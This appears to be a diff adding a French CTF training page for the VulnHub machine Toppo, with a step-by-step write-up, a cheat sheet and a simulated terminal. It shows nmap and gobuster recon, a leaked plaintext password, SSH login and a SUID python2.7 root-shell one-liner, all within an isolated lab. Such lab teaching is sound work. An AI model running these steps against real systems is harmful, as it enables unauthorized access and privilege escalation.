@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Toppo v2 — Bac à sable libre</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="lab.css?v=6">
+<link rel="stylesheet" href="sim.css?v=1">
+</head>
+<body>
+
+  <div class="wrap">
+    <div class="hero">
+      <p class="breadcrumb"><a href="index.html">← Hub</a></p>
+      <p class="kicker">vulnhub :: nmap → web → ssh → privesc · <span class="v2-pill">v2 — bac à sable libre</span></p>
+      <h1>Toppo<br>Exploration libre</h1>
+      <p class="lead">Même machine, même faille, nouveau moteur : au lieu de taper une suite de commandes imposées, tu navigues un vrai système de fichiers (permissions comprises), un vrai petit réseau, et tu choisis toi-même ton chemin jusqu'au shell root. La note n'est plus « bon/pas bon » mais un barème détaillé par objectif.</p>
+      <div class="meta-row">
+        <div class="meta-item"><span class="label">Cible</span><span class="value">Toppo · 192.168.56.102</span></div>
+        <div class="meta-item"><span class="label">Attaquant</span><span class="value">Kali Linux · 192.168.56.101</span></div>
+        <div class="meta-item"><span class="label">Réseau</span><span class="value">Host-Only VirtualBox (isolé)</span></div>
+        <div class="meta-item"><span class="label">Résultat</span><span class="badge">root + flag</span></div>
+        <div class="meta-item"><span class="label">Difficulté</span><span class="score-badge" style="color:#5fd9a4; border:1px solid #5fd9a4; background:#5fd9a418;">2/10 · Introduction</span></div>
+        <div class="meta-item"><span class="label">Puissance</span><span class="score-badge" style="color:#6db8ff; border:1px solid #6db8ff; background:#6db8ff18;">5/5 · Root total</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <section id="chrono">
+      <h2 class="section-title">Chronologie — le write-up</h2>
+      <p class="section-intro">Six étapes, du scan réseau au flag final. Ce déroulé reste la référence si tu bloques ou pour réviser après coup ; le terminal ci-dessous, lui, ne t'impose plus cet ordre.</p>
+
+      <h4 style="font-family:var(--mono); font-size:13px; color:var(--accent); margin:0 0 14px; font-weight:500;">Méthode exacte, en un coup d'œil</h4>
+      <div class="playbook">
+        <div class="playbook-row">
+          <div class="playbook-num">1</div>
+          <div class="playbook-what"><strong>Reconnaissance</strong><span>nmap -sV -sC</span></div>
+          <div class="playbook-why">Repérer SSH (22) et HTTP (80), les deux seuls ports utiles.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">2</div>
+          <div class="playbook-what"><strong>Énumération web</strong><span>gobuster dir</span></div>
+          <div class="playbook-why">Trouver les répertoires cachés : /admin, /mail.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">3</div>
+          <div class="playbook-what"><strong>Fuite d'info</strong><span>notes.txt</span></div>
+          <div class="playbook-why">Identifiants en clair dans un fichier exposé.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">4</div>
+          <div class="playbook-what"><strong>Connexion SSH</strong><span>ssh ted@IP</span></div>
+          <div class="playbook-why">Entrer sur la machine avec les creds trouvés.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">5</div>
+          <div class="playbook-what"><strong>Énumération locale</strong><span>find / -perm -4000</span></div>
+          <div class="playbook-why">Repérer un binaire SUID root anormal.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">6</div>
+          <div class="playbook-what"><strong>Élévation</strong><span>python2.7 SUID → root</span></div>
+          <div class="playbook-why">Shell root immédiat, flag final.</div>
+        </div>
+      </div>
+
+      <div class="timeline">
+        <div class="step">
+          <div class="step-num">1</div>
+          <h3>Reconnaissance — nmap</h3>
+          <p class="step-sub">Cartographier les services exposés avant toute chose.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali: ~</div>
+            <pre><span class="prompt">$</span> nmap -sV -sC 192.168.56.102<button class="copy-btn" type="button" data-copy="nmap -sV -sC 192.168.56.102" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">PORT    STATE SERVICE VERSION</span>
+<span class="out">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4</span>
+<span class="out">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span>
+<span class="out">111/tcp open  rpcbind 2-4 (RPC #100000)</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">à retenir</span><span class="v">On garde <strong>22</strong> (SSH) et <strong>80</strong> (HTTP). 111 (rpcbind) est un service système, inutile ici.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">2</div>
+          <h3>Énumération web — gobuster</h3>
+          <p class="step-sub">Chercher les répertoires et fichiers cachés derrière Apache.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali: ~</div>
+            <pre><span class="prompt">$</span> gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<button class="copy-btn" type="button" data-copy="gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">admin                (Status: <span class="st301">301</span>) [<span class="link">--> http://192.168.56.102/admin/</span>]</span>
+<span class="out">mail                 (Status: <span class="st301">301</span>) [<span class="link">--> http://192.168.56.102/mail/</span>]</span>
+<span class="out">LICENSE              (Status: <span class="st200">200</span>)</span>
+<span class="out">server-status        (Status: <span class="st403">403</span>)</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">à retenir</span><span class="v">On garde <strong>/admin</strong> et <strong>/mail</strong>. Le reste (img, css, js…) est du template.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">3</div>
+          <h3>Fuite d'information — notes.txt</h3>
+          <p class="step-sub">Un fichier texte exposé contient les identifiants.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>navigateur / curl</div>
+            <pre><span class="prompt">$</span> curl http://192.168.56.102/admin/notes.txt<button class="copy-btn" type="button" data-copy="curl http://192.168.56.102/admin/notes.txt" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">Note to myself :</span>
+<span class="out">I need to change my password :/</span>
+<span class="out">12345ted123 is too outdated but the technology isn't my thing</span>
+<span class="out">i prefer go fishing or watching soccer .</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">mot de passe</span><span class="v"><strong>12345ted123</strong> — en clair dans le fichier.</span>
+            <span class="k">indice user</span><span class="v">Le texte parle de « fishing » → le compte est <strong>ted</strong> (cf. le fichier personnel trouvé une fois connecté).</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">4</div>
+          <h3>Connexion SSH — ted</h3>
+          <p class="step-sub">On entre sur la machine avec les identifiants trouvés.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali: ~</div>
+            <pre><span class="prompt">$</span> ssh ted@192.168.56.102<button class="copy-btn" type="button" data-copy="ssh ted@192.168.56.102" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">Are you sure you want to continue connecting (yes/no)? yes</span>
+<span class="out">ted@192.168.56.102's password: </span>
+<span class="prompt">ted@Toppo:~$</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">à retenir</span><span class="v">Le mot de passe ne s'affiche pas en le tapant — c'est normal, c'est comme ça sur un vrai SSH.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">5</div>
+          <h3>Énumération locale — SUID</h3>
+          <p class="step-sub">Après un premier accès, on cherche les moyens de passer root.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>ted@Toppo: ~</div>
+            <pre><span class="prompt">ted@Toppo:~$</span> find / -perm -4000 -type f 2>/dev/null<button class="copy-btn" type="button" data-copy="find / -perm -4000 -type f 2>/dev/null" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">/sbin/mount.nfs</span>
+<span class="out">/usr/bin/python2.7</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">anomalie</span><span class="v"><strong>/usr/bin/python2.7</strong> est SUID root → aucune Debian standard ne fait ça.</span>
+            <span class="k">sudo -l</span><span class="v">sudo n'est même pas installé sur cette machine → la voie classique est fermée, il faut chercher ailleurs.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">6</div>
+          <h3>Élévation — python2.7 SUID → root</h3>
+          <p class="step-sub">Un interpréteur SUID root donne un shell root immédiat.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>ted@Toppo: ~</div>
+            <pre><span class="prompt">ted@Toppo:~$</span> python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'<button class="copy-btn" type="button" data-copy="python2.7 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">root@Toppo:~#</span> cat /root/flag.txt<button class="copy-btn" type="button" data-copy="cat /root/flag.txt" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="flag">Congratulations ! there is your flag : 0wnedlab{••••••••••••••••}</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">os.setuid(0)</span><span class="v">force l'UID effectif à root (le SUID du binaire le permet déjà).</span>
+            <span class="k">flag</span><span class="v">à récupérer toi-même dans le terminal, puis à valider avec le champ <strong>flag</strong> en bas.</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="cheatsheet">
+      <h2 class="section-title">Commandes à retenir</h2>
+      <div class="cheat-group">
+        <h4>reconnaissance</h4>
+        <table class="cheat">
+          <tr><td class="cmd">nmap -sV -sC IP</td><td class="desc">ports + versions</td></tr>
+          <tr><td class="cmd">gobuster dir -u URL -w WORDLIST</td><td class="desc">énumération de répertoires web</td></tr>
+        </table>
+      </div>
+      <div class="cheat-group">
+        <h4>accès initial</h4>
+        <table class="cheat">
+          <tr><td class="cmd">curl http://IP/chemin/fichier.txt</td><td class="desc">lire un fichier exposé</td></tr>
+          <tr><td class="cmd">ssh user@IP</td><td class="desc">connexion SSH</td></tr>
+        </table>
+      </div>
+      <div class="cheat-group">
+        <h4>énumération locale — VRAIMENT navigable ici</h4>
+        <table class="cheat">
+          <tr><td class="cmd">ls -la / cd / pwd</td><td class="desc">se déplacer dans l'arborescence réelle</td></tr>
+          <tr><td class="cmd">cat / head / tail / grep -r</td><td class="desc">lire et fouiller le contenu des fichiers</td></tr>
+          <tr><td class="cmd">find / -perm -4000 -type f</td><td class="desc">binaires SUID</td></tr>
+        </table>
+      </div>
+      <div class="cheat-group">
+        <h4>élévation — SUID</h4>
+        <table class="cheat">
+          <tr><td class="cmd">python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'</td><td class="desc">shell root via python SUID</td></tr>
+          <tr><td class="cmd">cat /root/flag.txt</td><td class="desc">lire le flag root (une fois root)</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <section id="concepts">
+      <h2 class="section-title">Ce qu'il faut vraiment comprendre</h2>
+      <div class="concepts">
+        <div class="concept">
+          <h4>On énumère avant d'exploiter</h4>
+          <p>Chaque étape produit une info qui guide la suivante. nmap donne les ports → gobuster donne les répertoires → notes.txt donne les creds → SSH donne un shell → find donne le SUID → le SUID donne root.</p>
+        </div>
+        <div class="concept">
+          <h4>Les permissions Unix ne sont pas décoratives</h4>
+          <p>Avant l'élévation, <code>cat /root/flag.txt</code> renvoie un vrai <code>Permission non accordée</code> : ted n'a ni les droits owner ni les droits "other" sur ce fichier. C'est exactement ce refus qui justifie tout le chapitre privesc — pas une convention du jeu.</p>
+        </div>
+        <div class="concept">
+          <h4>Un SUID anormal, c'est une porte ouverte</h4>
+          <p>Sur Debian, python2.7 n'est jamais SUID root. Dès qu'un binaire interpréteur (python, perl, vim, less…) est SUID, il donne un shell root immédiat.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="practice">
+      <h2 class="section-title">Terminal — bac à sable libre</h2>
+      <p class="section-intro">Aucune étape imposée : scanne, navigue, lis, fouille dans l'ordre que tu veux. Le panneau <strong>Objectifs</strong> (icône 🎯 en haut du terminal) suit ta progression en direct et calcule ta note au fur et à mesure — tu peux le laisser fermé et n'y jeter un œil qu'à la fin.</p>
+
+      <div class="term-launch">
+        <button class="term-launch-btn" id="term-open-btn" type="button">
+          <span class="term-launch-dot"></span>
+          Ouvrir le terminal
+        </button>
+        <p class="term-launch-sub">Plein écran · shell simulé réellement navigable · historique ↑ / ↓ · Tab complète</p>
+      </div>
+    </section>
+
+    <footer>
+      <div class="note">
+        <span class="ok">✓</span> lab isolé — réseau Host-Only VirtualBox. Moteur v2 : sim-engine.js + sim-data-toppo.js.
+      </div>
+    </footer>
+  </div>
+
+  <!-- ============================ TERMINAL PLEIN ECRAN ============================ -->
+  <div class="term-fullscreen" id="term-fullscreen">
+    <div class="term-fs-header">
+      <div class="term-fs-headrow">
+        <div class="term-fs-titlebar">
+          <button type="button" class="term-fs-dot r" id="term-close-dot" aria-label="Fermer le terminal" title="Fermer le terminal"></button>
+          <span class="term-fs-dot y"></span><span class="term-fs-dot g"></span>
+          <span class="term-fs-context" id="sim-context">kali@kali</span>
+        </div>
+        <div class="term-fs-actions">
+          <button class="term-fs-note" id="note-badge" type="button" title="Voir le détail des objectifs">🎯 0/7 · 0/20</button>
+          <button class="term-fs-close" id="term-fsbtn" type="button" aria-label="Basculer en plein écran" title="Plein écran">
+            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 9V4h5"/><path d="M20 9V4h-5"/><path d="M4 15v5h5"/><path d="M20 15v5h-5"/></svg>
+          </button>
+        </div>
+      </div>
+    </div>
+    <div class="term-menubar" aria-hidden="true">
+      <span>Session</span><span>Actions</span><span>Edit</span><span>View</span><span>Help</span>
+    </div>
+    <div class="term-fs-header term-fs-header--lower">
+      <div class="term-fs-info">
+        <span class="item">Cible <strong>192.168.56.102</strong></span>
+        <span class="item">Attaquant <strong>192.168.56.101</strong></span>
+      </div>
+      <div class="term-findings" id="term-findings" aria-label="Informations découvertes pendant l'exercice"></div>
+    </div>
+
+    <div class="sim-body" id="sim-body">
+      <div class="sim-line appear"><span class="o dim">Session ouverte — root@kali. Rien n'a encore été scanné ni exploré.</span></div>
+      <div class="sim-line appear"><span class="o dim">Tape <span class="hl-gold">help</span> pour la liste des commandes, ou lance directement <span class="hl-gold">nmap -sV -sC 192.168.56.102</span>.</span></div>
+      <div class="sim-line sim-inputline" id="sim-inputline">
+        <span class="p" id="sim-prompt-label"></span>
+        <input id="sim-input" class="sim-input" type="text" placeholder="tape ta commande puis Entrée… (↑ ↓ historique, Tab complète)" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" inputmode="text">
+      </div>
+    </div>
+
+    <div class="term-fs-footer">
+      <div class="sim-controls">
+        <button class="sim-btn" id="obj-toggle-btn">🎯 Objectifs</button>
+        <button class="sim-btn" id="writeup-scroll-btn">📄 Write-up</button>
+        <button class="sim-btn" id="sim-reset-btn">↺ Recommencer</button>
+        <form class="flag-form" id="flag-form" autocomplete="off" novalidate>
+          <span class="flag-icon" aria-hidden="true">⚑</span>
+          <input id="flag-input" class="flag-input" type="text" placeholder="0wnedlab{…}" aria-label="Flag à valider" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="120" name="flag-answer-not-stored">
+          <button type="submit" class="sim-btn flag-submit" id="flag-submit">Valider</button>
+          <span class="flag-msg" id="flag-msg" role="status" aria-live="polite"></span>
+        </form>
+      </div>
+    </div>
+
+    <!-- Panneau objectifs (tiroir) -->
+    <div class="obj-overlay" id="obj-overlay"></div>
+    <aside class="obj-panel" id="obj-panel" aria-label="Objectifs et score">
+      <div class="obj-panel-head">
+        <span>Objectifs &amp; score</span>
+        <button type="button" id="obj-close-btn" aria-label="Fermer">✕</button>
+      </div>
+      <div class="obj-score-block">
+        <div class="obj-score-num" id="obj-score-num">0/20</div>
+        <div class="obj-score-sub" id="obj-score-sub">0 objectif sur 7 validé</div>
+      </div>
+      <div class="obj-list" id="obj-list"></div>
+      <div class="obj-bonus-head">Bonus (trouvailles optionnelles)</div>
+      <div class="obj-list obj-list-bonus" id="obj-bonus-list"></div>
+      <p class="obj-formula">Barème : 100 pts répartis sur les 7 objectifs coeur → note /20. Un indice coûte 15% des points de l'objectif concerné (max 2 indices comptés), une solution révélée plafonne l'objectif à 40% de ses points. Le flag validé garantit un plancher de 4/20.</p>
+    </aside>
+  </div>
+
+  <!-- ============================ MODALE SUCCES (flag) ============================ -->
+  <div class="flag-modal" id="flag-modal" role="dialog" aria-modal="true" aria-labelledby="flag-modal-title" aria-hidden="true">
+    <canvas class="flag-confetti" id="flag-confetti" aria-hidden="true"></canvas>
+    <div class="flag-card" id="flag-card">
+      <div class="flag-card-bar">
+        <button type="button" class="term-fs-dot r" id="flag-modal-x" aria-label="Fermer" title="Fermer"></button><span class="term-fs-dot y"></span><span class="term-fs-dot g"></span>
+        <span class="flag-card-title">toppo — validation</span>
+      </div>
+      <div class="flag-card-body">
+        <div class="flag-seal" aria-hidden="true">
+          <svg viewBox="0 0 120 120">
+            <circle class="seal-ring" cx="60" cy="60" r="52"/>
+            <circle class="seal-ring-2" cx="60" cy="60" r="44"/>
+            <path class="seal-check" d="M38 62 L54 78 L84 44"/>
+          </svg>
+        </div>
+        <p class="flag-kicker">accès root confirmé</p>
+        <h2 class="flag-card-h" id="flag-modal-title">Flag validé</h2>
+        <p class="flag-sub">Machine <strong>Toppo</strong> compromise : de nmap jusqu'au shell root, à ton rythme.</p>
+        <div class="flag-stats">
+          <div><span class="fs-k">note</span><span class="fs-v" id="flag-stat-note">—</span></div>
+          <div><span class="fs-k">indices</span><span class="fs-v" id="flag-stat-hints">0</span></div>
+          <div><span class="fs-k">solutions</span><span class="fs-v" id="flag-stat-sols">0</span></div>
+          <div><span class="fs-k">bonus</span><span class="fs-v" id="flag-stat-bonus">0</span></div>
+        </div>
+        <div class="flag-actions">
+          <button type="button" class="sim-btn flag-primary" id="flag-modal-close">Continuer</button>
+          <button type="button" class="sim-btn" id="flag-modal-replay">↺ Rejouer</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<script src="sim-engine.js?v=1"></script>
+<script src="sim-data-toppo.js?v=1"></script>
+<script>
+  // Pour réutiliser ce même trio (sim-engine.js + sim-ui.js) sur un autre
+  // cours : créer un sim-data-xxx.js sur ce modèle, l'enregistrer sous une
+  // autre clé dans PENTESTLAB_COURSES, puis changer juste la ligne suivante.
+  window.PENTESTLAB_COURSE_ID = "toppo";
+</script>
+<script src="sim-ui.js?v=1"></script>
+</body>
+</html>
